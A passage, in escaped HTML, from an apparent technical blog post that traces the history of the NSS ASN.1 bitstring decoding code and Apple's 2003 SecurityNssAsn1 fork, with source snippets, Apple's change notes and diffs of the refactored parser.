class=\"c1\"&gt;(!&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;indefinite&lt;/span&gt;&lt;span class=\"c1\"&gt;))&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* A zero-length simple or constructed string; we are done.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;afterEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;else&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;indefinite&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* An indefinite-length string *must* be constructed!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dprintf&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c22\"&gt;&amp;quot;decodeError: prepare for contents indefinite not construncted\\n&amp;quot;&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PORT_SetError &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;SEC_ERROR_BAD_DER&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;status &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;decodeError&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;yet it is required that &lt;/span&gt;&lt;span class=\"c17\"&gt;neither&lt;/span&gt;&lt;span&gt;&amp;nbsp;of those be true in order to reach the final &lt;/span&gt;&lt;span class=\"c7\"&gt;else&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is the only path to reaching &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span&gt;&amp;nbsp;via the &lt;/span&gt;&lt;span class=\"c7\"&gt;beforeBitString&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;state:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.fc4cdcb36935579371eeed8ebee2943f0d688093\"&gt;&lt;/a&gt;&lt;a id=\"t.19\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;else&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* A non-zero-length simple string.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;underlying_kind &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;SEC_ASN1_BIT_STRING&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;else&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;duringLeaf&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;So at that point (24 August 2001) the NSS codebase had some dead code which looked like it was trying to handle parsing an ASN.1 &lt;/span&gt;&lt;span class=\"c7\"&gt;bitstring&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;which didn&amp;#39;t have an unused-bits byte. As we&amp;#39;ve seen in the rest of this post though, that handling is quite wrong, but it didn&amp;#39;t matter as the code was unreachable. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The earliest reference to Apple&amp;#39;s fork of that NSS code I can find is in the &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://github.com/apple-oss-distributions/SecurityNssAsn1/tree/SecurityNssAsn1-11\"&gt;SecurityNssAsn1-11&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;package for OS X 10.3 (Panther) which would have been released October 24th, 2003. In that project we can find a &lt;/span&gt;&lt;span class=\"c7\"&gt;CHANGES.apple&lt;/span&gt;&lt;span&gt;&amp;nbsp;file which tells us &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://github.com/apple-oss-distributions/SecurityNssAsn1/blob/SecurityNssAsn1-11/CHANGES.Apple\"&gt;a little more about the origins of Apple&amp;#39;s fork&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;General Notes&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;-------------&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c19 c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;1. This module, SecurityNssAsn1, is based on the Netscape Security&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; &amp;nbsp;Services (&amp;quot;NSS&amp;quot;) portion of the Mozilla Browser project. The &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; &amp;nbsp;source upon which SecurityNssAsn1 was based was pulled from &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c7 c19\"&gt;&amp;nbsp; &amp;nbsp;the Mozilla CVS repository, top of tree as of January 21, 2003. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; &amp;nbsp;The SecurityNssAsn1 project contains only those portions of NSS &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; &amp;nbsp;used to perform BER encoding and decoding, along with minimal &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; &amp;nbsp;support required by the encode/decode routines.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c19 c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;2. The directory structure of SecurityNssAsn1 differs significantly&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; &amp;nbsp;from that of NSS, rendering simple diffs to document changes&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; &amp;nbsp;unwieldy. Diffs could still be performed on a file-by-file basis.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;3. All Apple changes are flagged by the symbol __APPLE__, either&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; &amp;nbsp;via &amp;quot;#ifdef __APPLE__&amp;quot; or in a comment. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;That document continues on to outline a number of broad changes which Apple made to the code, including reformatting the code and changing a number of APIs to add new features. We also learn the date at which Apple forked the code (January 21, 2003) so we can go back through a github mirror of the mozilla CVS repository to find &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://github.com/jrmuizel/mozilla-cvs-history/blob/1f25ac6059384ad941cb20481acef0e6b4d46dbd/security/nss/lib/util/secasn1d.c\"&gt;the version of secasn1d.c as it would have appeared then&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and diff them.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;From that diff we can see that the Apple developers actually made fairly significant changes in this initial import, indicating that this code underwent some level of review prior to importing it. For example:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.29dca04094676297fb74e68684dc5ebea1c1ec48\"&gt;&lt;/a&gt;&lt;a id=\"t.20\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;@@&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c11\"&gt;1584&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;7&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c11\"&gt;1692&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;15&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;@@&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; * If our child was just our end-of-contents octets, we are done.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;#ifdef&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; __APPLE__&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;/* &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Without the check for !child-&amp;gt;indefinite, this path could&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* be taken erroneously if the child is indefinite!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c23\"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;child&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;endofcontents &lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;!&lt;/span&gt;&lt;span class=\"c3\"&gt;child&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;indefinite&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;#else&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;child&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;endofcontents&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;They were pretty clearly looking for potential correctness issues with the code while they were refactoring it. The example shown above is a non-trivial change and one which persists to this day. (And I have no idea whether the NSS or Apple version is correct!) Reading the diff we can see that not every change ended up being marked with &lt;/span&gt;&lt;span class=\"c7\"&gt;#ifdef __APPLE__&lt;/span&gt;&lt;span&gt;&amp;nbsp;or a comment. They also made this change to &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class=\"c9\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.f88b5d5286baf17de20f09e61c06eac6b0acbd51\"&gt;&lt;/a&gt;&lt;a id=\"t.21\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;@@&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c11\"&gt;1372&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;26&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c11\"&gt;1469&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;33&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;@@&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;/*PORT_Assert (state-&amp;gt;pending &amp;gt; 0); */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;PORT_Assert &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;pending &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest &lt;/span&gt;&lt;span class=\"c1\"&gt;!=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c20\"&gt;SECItem&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;item &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c20\"&gt;SECItem&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;data &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;len &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 